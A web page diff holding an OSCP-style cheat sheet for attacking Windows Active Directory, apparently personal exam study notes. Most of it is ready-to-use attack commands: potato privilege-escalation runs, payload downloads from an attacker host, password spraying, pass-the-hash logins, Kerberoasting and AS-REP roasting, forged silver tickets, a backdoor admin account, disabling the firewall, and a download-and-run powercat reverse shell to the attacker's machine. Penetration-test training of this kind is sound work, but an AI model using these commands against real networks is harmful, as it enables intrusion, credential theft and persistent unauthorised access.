@@ -1,0 +1,803 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Cheat Sheet - AD :: Digital Garden</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Related: OSCP
+HackTricks - AD Methodology
+Initial Access whoami, whoami /all whoami /priv SeImpersonatePrivilege Run SweetPotato ./sweetpotato.exe -a &quot;C:\Users\Public\revshell.exe&quot; FullPowers tool How to use potatoes &amp; - Pre-compiled Potatoes How to use Juicy/Rogue Potato &amp; Printspoofer Printspoofer - GitHub .\PrintSpoofer64.exe -i -c powershell.exe whoami Juicy Potato - Github .\juicypotato.exe -l -p c:\Users\tony\revshell.exe -t * -c &quot;{9E175B9C-F52A-11D8-B9A5-505054503030}&quot; SEbackupPriv https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/ https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md SeShutdownPrivilege Can a startup process be modified? Then modify &amp; reboot Check service has Auto: `Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like &lsquo;httpd&rsquo;} Reboot: shutdown /r /t 0 SeManageVolumePrivilege wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe whoami /groups, net localgroup or Get-LocalGroup (Existing groups) Get-LocalGroupMember groupname (Inspect) systeminfo (wiki build number) Windows kernel exploits More Initial Access
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/cheat-sheet---ad/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="/favicon.png">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Cheat Sheet - AD">
+<meta property="og:description" content="Related: OSCP
+HackTricks - AD Methodology
+Initial Access whoami, whoami /all whoami /priv SeImpersonatePrivilege Run SweetPotato ./sweetpotato.exe -a &quot;C:\Users\Public\revshell.exe&quot; FullPowers tool How to use potatoes &amp; - Pre-compiled Potatoes How to use Juicy/Rogue Potato &amp; Printspoofer Printspoofer - GitHub .\PrintSpoofer64.exe -i -c powershell.exe whoami Juicy Potato - Github .\juicypotato.exe -l -p c:\Users\tony\revshell.exe -t * -c &quot;{9E175B9C-F52A-11D8-B9A5-505054503030}&quot; SEbackupPriv https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/ https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md SeShutdownPrivilege Can a startup process be modified? Then modify &amp; reboot Check service has Auto: `Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like &lsquo;httpd&rsquo;} Reboot: shutdown /r /t 0 SeManageVolumePrivilege wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe whoami /groups, net localgroup or Get-LocalGroup (Existing groups) Get-LocalGroupMember groupname (Inspect) systeminfo (wiki build number) Windows kernel exploits More Initial Access
+" />
+<meta property="og:url" content="/posts/cheat-sheet---ad/" />
+<meta property="og:site_name" content="Digital Garden" />
+
+  <meta property="og:image" content="/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Digital Garden
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about/">About</a></li>
+        
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about/" >About</a></li>
+        
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+      
+        <li>
+          <ul class="menu">
+            <li class="menu__trigger">Show more&nbsp;▾</li>
+            <li>
+              <ul class="menu__dropdown">
+                
+                  
+                    <li><a href="/showcase" >Showcase</a></li>
+                  
+                
+              </ul>
+            </li>
+          </ul>
+        </li>
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/cheat-sheet---ad/">Cheat Sheet - AD</a>
+  </h1>
+  <div class="post-meta"></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/oscp/">OSCP</a>&nbsp;
+      
+      #<a href="/tags/cybersecurity/">Cybersecurity</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>Related: <a href="/posts/cheat-sheet---ad/">OSCP</a></p>
+<hr>
+<p><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology">HackTricks - AD Methodology</a></p>
+<h1 id="initial-access">Initial Access<a href="#initial-access" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li><code>whoami</code>, <code>whoami /all</code></li>
+<li><code>whoami /priv</code>
+<ul>
+<li>SeImpersonatePrivilege
+<ul>
+<li>Run <a href="https://github.com/CCob/SweetPotato">SweetPotato</a>
+<ul>
+<li><code>./sweetpotato.exe -a &quot;C:\Users\Public\revshell.exe&quot;</code></li>
+</ul>
+</li>
+<li><a href="https://github.com/itm4n/FullPowers">FullPowers tool</a></li>
+<li><a href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc">How to use potatoes</a> &amp; - <a href="https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/privileges-abuse/seimpersonate/potatoes" title="Pre-compiled">Pre-compiled Potatoes</a></li>
+<li><a href="https://juggernaut-sec.com/seimpersonateprivilege/">How to use Juicy/Rogue Potato &amp; Printspoofer</a></li>
+<li><a href="https://github.com/itm4n/PrintSpoofer">Printspoofer - GitHub</a> <code>.\PrintSpoofer64.exe -i -c powershell.exe</code> <code>whoami</code></li>
+<li><a href="https://github.com/k4sth4/Juicy-Potato/tree/main">Juicy Potato - Github</a> <code>.\juicypotato.exe -l  -p c:\Users\tony\revshell.exe -t * -c &quot;{9E175B9C-F52A-11D8-B9A5-505054503030}&quot;</code></li>
+</ul>
+</li>
+<li>SEbackupPriv
+<ul>
+<li><a href="https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/">https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/</a></li>
+<li><a href="https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md">https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md</a></li>
+</ul>
+</li>
+<li>SeShutdownPrivilege
+<ul>
+<li>Can a startup process be modified? Then modify &amp; reboot</li>
+<li>Check service has <code>Auto</code>: `Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like &lsquo;httpd&rsquo;}</li>
+<li>Reboot: <code>shutdown /r /t 0</code></li>
+</ul>
+</li>
+<li><a href="https://github.com/xct/SeManageVolumeAbuse">SeManageVolumePrivilege</a>
+<ul>
+<li><code>wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe</code></li>
+<li></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>whoami /groups</code>,
+<ul>
+<li><code>net localgroup</code> or <code>Get-LocalGroup</code> (Existing groups)</li>
+<li><code>Get-LocalGroupMember groupname</code> (Inspect)</li>
+</ul>
+</li>
+<li><code>systeminfo</code> (wiki build number)
+<ul>
+<li>Windows kernel exploits</li>
+</ul>
+</li>
+</ul>
+<p>More Initial Access</p>
+<ul>
+<li>
+<p>Lockout policy: <code>net accounts</code></p>
+</li>
+<li>
+<p><code>net user</code> or <code>Get-LocalUser</code></p>
+<ul>
+<li>Look for <em>Remote Desktop Users</em> (use RDP) and <em>Remote Management Users</em> (use WinRM)</li>
+<li><code>net user jeffadmin /domain</code> (look for Domain Admins) (look for prefix/suffix accounts)
+<ul>
+<li>Login: <code>evil-winrm -i 192.168.xx.xxx -u user -p &quot;password\$\!&quot;</code></li>
+<li>Escape special characters: <code>&quot;password$!&quot;</code> = <code>&quot;password\$\!&quot;</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>net group /domain</code> (look for custom groups)</p>
+<ul>
+<li><code>net group &quot;Sale Department&quot; /domain</code></li>
+</ul>
+</li>
+<li>
+<p><code>winpeas</code>: <code>cp ~/Tools/Windows/winpeasx64.exe .</code> &amp; <code>python3 -m http.server 80</code></p>
+</li>
+<li>
+<p><code>sc query | findstr /i servicetofind</code> &amp; <code>sc qc servicename</code></p>
+<ul>
+<li>Look for &ldquo;Local System&rdquo; and &ldquo;<em>Log on as a batch job</em>&rdquo;
+<ul>
+<li>Schedule a task to execute a program</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>runas /user:backupadmin cmd</code> (Prompts for password)</p>
+</li>
+<li>
+<p><code>ipconfig /all</code></p>
+<ul>
+<li>Check <code>route print</code> &amp; show active connections <code>netstat -ano</code></li>
+</ul>
+</li>
+<li>
+<p>Applications:</p>
+<ul>
+<li>32-bit: <code>Get-ItemProperty &quot;HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&quot; | select displayname</code> (Remove <code>select displayname</code> for full properties)</li>
+<li>64-bit: <code>Get-ItemProperty &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*&quot; | select displayname</code> (Remove <code>select displayname</code> for full properties)</li>
+</ul>
+</li>
+<li>
+<p><code>get-process</code></p>
+<ul>
+<li>Running processes <code>Powershell: Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}</code>
+<ul>
+<li>Look for services NOT installed in <code>System32</code></li>
+</ul>
+</li>
+<li>Check binary permissions; `Powershell: icacls &ldquo;C:\xampp\apache\bin\httpd.exe&rdquo;
+<ul>
+<li>Look for <code>BUILTIN\Users:(F)</code> (Full Access for standard users)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>Get-ObjectAcl -Identity objectorusername</code></p>
+<ul>
+<li>Find <code>ActiveDirectoryRights</code> &amp; <code>SecurityIdentifier</code></li>
+<li>Find &ldquo;GenericAll&rdquo;:<code>Get-ObjectAcl -Identity &quot;Management Department&quot; | ? {$_.ActiveDirectoryRights -eq &quot;GenericAll&quot;} | select SecurityIdentifier,ActiveDirectoryRights</code></li>
+<li>Convert SID: <code>Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104</code>
+<ul>
+<li>Alt: <code>&quot;S-1-5-21-1987370270-658905905-1781884369-1104&quot;, S-1-5-21-1987370270-658905905-1781884369-503&quot; | Convert-SidToName</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="file-transfers">File Transfers<a href="#file-transfers" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>Windows</p>
+<ul>
+<li>CMD: <code>certutil.exe -f -urlcache http://kaliIP/revshell.exe</code></li>
+<li>Powershell: <code>iwr -uri http://192.168.xx.xxx/winPEASx64.exe -Outfile winPEAS.exe</code>
+Kali</li>
+<li><code>python3 -m http 80</code></li>
+<li>Impacket - <a href="https://www.youtube.com/watch?v=A5xZ05THaao">Walkthrough</a> &amp;
+<ul>
+<li><code>impacket-smbserver -smb2support stage .</code></li>
+<li>Share: <code>impacket-smbserver share ~/Tools/Share -smb2support -d</code> (add <code>-user username -password password</code>)</li>
+<li>Windows Target, enter attacker IP: `\192.168.xx.xxx\</li>
+</ul>
+</li>
+<li>NetCat
+<ul>
+<li><code>/usr/share/seclists/Web-Shells/FuzzDB/nc.exe</code></li>
+<li>Listener on target: <code>nc.exe -nvlp 4433 &gt; unix-privesc-check</code></li>
+<li>On attacker, open nc to send: <code>nc -nv 192.168.target.machine 4433 &lt; /usr/bin/unix-privesc-check</code></li>
+</ul>
+</li>
+</ul>
+<h1 id="privesc">PrivEsc<a href="#privesc" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation">HackTricks Windows PrivEsc</a></p>
+<ul>
+<li>Run <a href="https://github.com/peass-ng/PEASS-ng/releases/tag/20240828-cfb5c8f6">WinPeas</a> (<code>~/Tools/Windows/winpeasx64.exe</code>)
+<ul>
+<li>Always check Watson responses (vulnerability list)</li>
+<li>Look for unquoted service path &ndash;&gt; rename revshell.exe and place in path, then run (is it scheduled? Start on reboot?)</li>
+</ul>
+</li>
+<li>Check scheduled tasks:
+<ul>
+<li><code>schtasks /query /fo LIST /v /TN &quot;Task name&quot;</code>
+<ul>
+<li>Check &ldquo;Run As User&rdquo;, &ldquo;Task To Run&rdquo; &amp; &ldquo;Repeat Every&rdquo;</li>
+<li>Start listener, then <code>echo revshell.exe &gt;&gt; scheduledtask.bat</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="https://github.com/PowerShellMafia/PowerSploit">Powersploit</a>
+<ul>
+<li><a href="https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview">PowerView.ps1</a> (See Tools) - <a href="https://powersploit.readthedocs.io/en/latest/Recon/">Powerview README</a>
+<ul>
+<li><code>Import-module .\PowerView.ps1</code></li>
+<li><code>Get-NetDomain</code></li>
+<li><code>Get-NetUser</code> (lots of detail), <code>Get-NetUser &quot;jeff&quot;</code>
+<ul>
+<li><code>Get-NetUser | select cn,pwdlastset,lastlogon</code></li>
+<li><code>Get-NetUser -SPN | select samaccountname,serviceprincipalname</code></li>
+</ul>
+</li>
+<li><code>Get-NetGroup | select cn</code>
+<ul>
+<li><code>Get-NetGroup &quot;Sales Department&quot; | select member</code></li>
+</ul>
+</li>
+<li><code>Get-NetComputer</code>, <code>Get-NetComputer &quot;host03&quot;</code>
+<ul>
+<li><code>Get-NetComputer | select operatingsystem,dnshostname</code></li>
+</ul>
+</li>
+<li><code>Find-DomainShare</code>
+<ul>
+<li><code>Find-DomainShare -CheckShareAccess</code> (look for <code>SYSVOL</code> on DC)</li>
+<li>DC: <code>ls \\dc1.corp.com\sysvol\corp.com\</code></li>
+<li>Host: <code>ls &quot;\\HOST04.corp.com\Important Files\&quot;</code></li>
+<li><code>cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml</code>
+<ul>
+<li><code>gpp-decrypt &quot;+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE&quot;</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>PowerUp.ps1 (See Tools)
+<ul>
+<li><code>/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1</code></li>
+<li><code>powershell -ep bypass</code> &amp; <code>. .\PowerUp.ps1</code></li>
+<li>Find vulnerable services: <code>Get-ModifiableServiceFile</code></li>
+</ul>
+</li>
+<li><a href="https://github.com/compwiz32/PowerShell/blob/master/Get-SPN.ps1">Get-spn.ps1</a>
+<ul>
+<li>Look for service accounts with better privileges</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<pre tabindex="0"><code>Add-Type -AssemblyName System.IdentityModel  
+  
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &#39;ServiceName/DC.domain.nameoffsec&#39;
+</code></pre><ul>
+<li>Run <code>jaws-enum.ps1</code></li>
+<li><code>enum4linux -h</code>
+<ul>
+<li>Users: <code>enum4linux -U</code> or <code>enum4linux -u user -p password</code></li>
+</ul>
+</li>
+</ul>
+<h1 id="pivot">Pivot<a href="#pivot" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li>Look at user data &amp; user history
+<ul>
+<li><code>tree /f /a</code></li>
+<li><code>dir /s/b *.log</code> or <code>dir /s/b *.txt</code></li>
+</ul>
+</li>
+<li><a href="https://github.com/nicocha30/ligolo-ng">ligolo-ng</a> <a href="https://github.com/nicocha30/ligolo-ng/wiki/Quickstart">Quick Start</a>
+<ul>
+<li><a href="https://www.youtube.com/watch?v=qou7shRlX_s">Youtube - Ligolo walkthrough</a></li>
+<li>Download <a href="https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_windows_amd64.zip">Agent.zip</a> &amp; <a href="https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz">Proxy.zip</a></li>
+<li>Run
+<ul>
+<li>Windows: Upload agent.exe</li>
+<li>Kali
+<ul>
+<li><code>sudo ip tuntap add user kali mode tun ligolo</code></li>
+<li><code>sudo ip link set ligolo up</code></li>
+<li><code>cd ~/Tools/ligolo_ng</code> <code>./proxy -selfcert</code> (Starts Ligolo)</li>
+</ul>
+</li>
+<li>Windows: <code>agent.exe kaliIP:11601 -retry -ignore-cert</code></li>
+<li>Kali
+<ul>
+<li>In Ligolo: <code>session</code> &amp; <code>start</code></li>
+<li>Start: <code>sudo ip route add target.ip.x.x/24 dev ligolo</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="password-spraying">Password Spraying<a href="#password-spraying" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/password-spraying">HackTricks - Password Spraying</a></p>
+<ul>
+<li>Spray Passwords through AD (on target): <code>.\Spray-Passwords.ps1 -Pass Password123! -Admin</code></li>
+<li>Spray through SMB shares (from Kali): <code>crackmapexec smb 192.168.target.ip -u users.txt -p 'Password123!' -d corp.com --continue-on-success</code> (users.txt is list of known AD users)
+<ul>
+<li>Crackmap will denote users with local admin priv with &ldquo;(Pwn3d!)&rdquo;</li>
+</ul>
+</li>
+<li>Spray through Kerberos TGT&rsquo;s (kerbrute)(on target): <code>.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\users.txt &quot;Nexus123!&quot;</code></li>
+</ul>
+<h1 id="lateral-movement">Lateral Movement<a href="#lateral-movement" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li>&ldquo;Run as&rdquo; domain user (CMD): <code>runas /user:domain\username cmd.exe</code>
+<ul>
+<li><code>net user /domain</code></li>
+</ul>
+</li>
+<li>With NTLM Hash
+<ul>
+<li>From Kali: <code>/usr/bin/impacket-wmiexec -hashes :USERNTLMHASHF84D7A70E2EB3B9F05C425E username@192.168.xx.xxx</code></li>
+<li>From Kali: <code>impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.xx.xxx</code></li>
+</ul>
+</li>
+<li>With creds
+<ul>
+<li><code>./PsExec64.exe -i  \\HOST04 -u domain\tgtuser -p Password123! cmd</code></li>
+<li>Kerberoasting: `impacket-getuserspns -request -dc-ip dc01 domain/username
+<ul>
+<li>Crack with <code>hashcat hashes /usr/share/wordlists/rockyou.txt</code></li>
+</ul>
+</li>
+<li>ASRep-Roast: `impacket-GetNPUsers -request -dc-ip dc01 domain/username -outputfile user.asrep
+<ul>
+<li>AS-REP hashes can&rsquo;t be passed (must crack)</li>
+<li>Crack with <code>hashcat user.asrep /usr/share/wordlist/rockyou.txt</code> (add <code>-r /usr/share/hashcat/rules/best64.rule</code> if have time)</li>
+<li>On Windows: <code>.\Rubeus.exe asreproast</code></li>
+<li>Save hash as <code>hashes.asreproast</code> (add <code>$23</code> separator to hash before username)</li>
+<li>Crack: <code>sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</code></li>
+</ul>
+</li>
+<li><code>impacket-psexe domain/username@ip.address</code></li>
+<li><code>crackmapexec smb $IP -u users -p &quot;PaSSw0rd&quot; -d domain.name</code></li>
+</ul>
+</li>
+<li>SMB (445)
+<ul>
+<li><code>enum4linux -A 192.168.x.x</code> (<code>-u user -p password</code>)</li>
+<li>Password spraying <code>crackmapexec smb 10.0.0.1 -u users.txt -p passwords.txt --continue-on-success --shares</code></li>
+<li><code>smbclient //dc01/share -U domain/username</code>
+<ul>
+<li><code>get filename.zip</code> (crack zip password with <code>zip2john</code>)</li>
+</ul>
+</li>
+<li><code>smbclient -L //192.168.x.x -U domain/username</code></li>
+</ul>
+</li>
+<li>RDP (3389)
+<ul>
+<li><code>crackmapexec rdp -u users -p passwords --continue-on-success 192.168.x.x.</code></li>
+</ul>
+</li>
+<li>WinRM (5985,5986)
+<ul>
+<li><code>crackmapexec winrm -u users -p passwords --continue-on-success 192.168.x.x.</code></li>
+<li>PassTheHash: <code>evil-winrm -i 192.168.x.x -u adminsitrator -H administratorhash</code></li>
+<li>Creds: <code>evil-winrm -i 192.168.x.x. -u adminname -p ADMINpassw0rd</code></li>
+</ul>
+</li>
+</ul>
+<h1 id="if-local-admin">If Local Admin&hellip;<a href="#if-local-admin" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li>Create backdoor account
+<ul>
+<li><code>user /add backdoor password1</code></li>
+<li><code>net localgroup administrators /add backdoor</code></li>
+</ul>
+</li>
+<li>Disable firewall
+<ul>
+<li><code>reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v &quot;fDenyTSConnections&quot; /t REG_DWORD /d 0 /f</code></li>
+<li><code>netsh advfirewall set allprofiles state off</code></li>
+</ul>
+</li>
+<li>Run <a href="https://github.com/ParrotSec/mimikatz">Mimikatz</a>
+<ul>
+<li><code>privilege::debug</code>, <code>token:elevate</code></li>
+<li>Find NTLM hashes: <code>sekurlsa::logonpasswords</code> or <code>lsadump::sam</code>
+<ul>
+<li><code>hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt</code></li>
+<li><code>hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</code></li>
+</ul>
+</li>
+<li>Dump tickets: <code>sekurlsa::tickets</code>
+<ul>
+<li>&ldquo;Ticket Granting Service&rdquo; has limited options</li>
+<li>&ldquo;Ticket Granting Ticket&rdquo; can request a TGS for specific resources</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Other
+<ul>
+<li>From Kali:`impacket-secretsdump <a href="mailto:domain/username@192.168.x.x">domain/username@192.168.x.x</a></li>
+<li>From Kali: <code>impacket-getNPUsers domain/user -outfile asrep.txt</code></li>
+</ul>
+</li>
+</ul>
+<h1 id="random">Random<a href="#random" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li>Move a file to the current directory: `mv ~/dir/filepath/file.txt .</li>
+<li>Comment out changes to code rather than deleting it</li>
+<li>Try a different type of python (eg. python2) if you get errors</li>
+<li>Run command then `| findstr /i username</li>
+</ul>
+<p><em><strong>AD Flowchart</strong></em> <a href="https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg">https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg</a></p>
+<h2 id="kerberoasting">Kerberoasting<a href="#kerberoasting" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>For attacking Service Principal Names (SPNs) running for users.</p>
+<p>NOTE: This only works for high-privilege service accounts with weak passwords.</p>
+<ul>
+<li>Look for SPNs running in the context of user accounts</li>
+<li>Will <strong>NOT</strong> work on computer, managed service, group-managed service, or <em>krbtgt</em> accounts</li>
+<li>Windows - Rubeus <code>.\Rubeus.exe kerberoast /outfile:hashes.kerberoast</code>
+<ul>
+<li>Then crack the hashes: <code>sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</code></li>
+</ul>
+</li>
+<li>Windows - <code>Invoke-Kerberoast.ps1</code> (serve with python3)
+<ul>
+<li><code>iex(new-object net.webclient).downloadString('http://192.168.kali.ip:80/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat Hashcat</code></li>
+<li><code>hashcat -m 13100 --force -a 0 mssql.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</code></li>
+<li>or <code>john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 MSSQL.hash</code></li>
+<li>With Creds:
+<ul>
+<li><code>wget https://raw.githubusercontent.com/antonioCoco/RunasCs/master/Invoke-RunasCs.ps1</code> &amp; transfer to target</li>
+<li><code>import-module ./Invoke-RunasCs.ps1</code></li>
+<li>`Invoke-RunasCs -Username serviceuser -Password servicepassword -Command &ldquo;whoami&rdquo;</li>
+<li><code>Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command &quot;Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.kali.ip/powercat.ps1');powercat -c 192.168.kali.ip -p 5555 -e cmd&quot;</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Kali - Impacket: <code>sudo impacket-GetUserSPNs -request -dc-ip 192.168.xx.xxx corp.com/jeff</code>
+<ul>
+<li>Save generated hash to a new file (eg. <code>hashes.kerberoast2</code>)
+Note: If Error <code>Clock Skew too great</code> is generated, run <code>ntpdate</code> or <code>rdate</code> to sync clock}</li>
+<li>Crack hash with Hashcat: <code>sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="silver-tickets">Silver Tickets<a href="#silver-tickets" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>To show Kerberos tickets (PowerShell): <code>klist</code>
+Creation requires:</p>
+<ul>
+<li>SPN Password hash
+<ul>
+<li>Run Mimikatz as administrator: <code>privilege::debug</code> &amp; <code>sekurlsa::logonpasswords</code></li>
+<li>Find NTLM hash for service you want (eg. NTLM for <code>iis_service</code>)</li>
+</ul>
+</li>
+<li>Domain SID
+<ul>
+<li>Get user SID: <code>whoami /user</code> (make sure to remove final 4/5 numbers if necessary)</li>
+</ul>
+</li>
+<li>Target SPN</li>
+</ul>
+<p>Use <code>Kerberos::Golden</code> in Mimikatz</p>
+<ul>
+<li>Example of iis_service to access website  <code>kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin</code></li>
+<li>User can be ANY user on the domain</li>
+</ul>
+<h1 id="bloodhound">BloodHound<a href="#bloodhound" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li><a href="https://github.com/BloodHoundAD">https://github.com/BloodHoundAD</a></li>
+<li><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound</a></li>
+<li><a href="https://support.bloodhoundenterprise.io/hc/en-us/articles/17715215791899-Getting-started-with-BloodHound-Community-Edition">https://support.bloodhoundenterprise.io/hc/en-us/articles/17715215791899-Getting-started-with-BloodHound-Community-Edition</a></li>
+<li>SoapHound <a href="https://github.com/FalconForceTeam/SOAPHound">https://github.com/FalconForceTeam/SOAPHound</a></li>
+<li>Custom bloodhound querys
+<ul>
